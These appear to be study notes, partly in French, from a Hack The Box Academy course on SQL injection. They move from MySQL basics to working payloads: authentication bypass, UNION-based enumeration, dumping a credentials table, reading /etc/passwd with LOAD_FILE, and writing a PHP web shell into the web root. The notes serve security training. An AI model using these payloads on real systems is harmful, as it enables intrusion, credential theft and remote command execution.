## Introduction : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/db_request_3.webp)

## Intro to Databases :

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/DBMS.png)

## Types of Databases :

### Relational Databases : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/web_apps_relational_db.jpg)

The relationship between tables within a database is called a Schema.

### Non-relational Databases : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/web_apps_non-relational_db.jpg)
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

## Intro to MySQL :

```shell
NolanCarougeHTB@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```

```mysql
MariaDB [(none)]> CREATE DATABASE users;
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
6 rows in set (0,018 sec)

MariaDB [(none)]> use employees;
MariaDB [employees]> SHOW TABLES;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0,018 sec)

CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
    
MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+
6 rows in set (0,019 sec)
```

```sql
id INT NOT NULL AUTO_INCREMENT,
username VARCHAR(100) UNIQUE NOT NULL,
date_of_joining DATETIME DEFAULT NOW(),
PRIMARY KEY (id)
  
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

## SQL Statements : 

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.

```sql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;

DROP TABLE logins;

ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN oldName TO newName;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;

UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```sql
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;

Query OK, 3 rows affected (0.00 sec)
Rows matched: 3  Changed: 3  Warnings: 0

mysql> SELECT * FROM logins;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

## Query Results : 

```sql
mysql> SELECT * FROM logins ORDER BY password DESC;
mysql> SELECT * FROM logins LIMIT 2;
mysql> SELECT * FROM logins LIMIT 1, 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+


mysql> SELECT * FROM logins where username = 'admin';
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+

mysql> SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
```

## SQL Operators : 

```sql

mysql> SELECT 1 = 1 AND 'test' = 'test';
mysql> SELECT 1 = 1 OR 'test' = 'abc';
mysql> SELECT NOT 1 = 1;


mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

Here is a list of common operations and their precedence, as seen in the [MariaDB Documentation](https://mariadb.com/kb/en/operator-precedence/)

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)
## Intro to SQL Injections : 

Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/types_of_sqli.jpg)

## Subverting Query Logic : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/Char%20Encoded.png)

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/or_inject_diagram.webp)
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

## Using Comments : 

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
```

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.

```sql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
```

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

## Union Clause : 

```sql
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+

mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+


mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

Note: The data types of the selected columns on all positions should be the same.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

## Union Injection : 

On doit savoir le nombre de colonnes de la table avant de faire une injection SQL avec ORDER BY.

```sql
' order by 1-- -
```

Puis 2,3 ... jusqu'à avoir une erreur.

Avec UNION : 

```sql
cn' UNION select 1,2,3,4-- -
```

On aura une erreur tant que le select ne correspond pas au nombre exact de colonne.

Trouver quels sont les colonnes affichées : 

```sql
cn' UNION select 1,@@version,3,4-- -
```

## Database Enumeration : 

Pour savoir si on a une BD MySQL : 

![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/Mysql.png)

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
```

```sql
SELECT * FROM my_database.users;
```

Dans l'exemple précédent : 

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
```

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

## Reading Files : 

Savoir qui nous sommes : 

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

L'injection devient : 

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

Connaitre nos privilèges : 

```sql
SELECT super_priv FROM mysql.user
```

L'injection devient : 

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Pour voir nos privilèges : 

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Lire des fichiers : 

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## Writing Files : 

To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Si la variable n'est pas mise à 1 alors on peut écrire dans des fichiers : 

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

Exemple avec le serveur :

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Web-shell : 

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', '', "" into outfile '/var/www/html/shell.php'-- -

cn' union select "",'<?php system("cat /var/www/flag.txt"); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
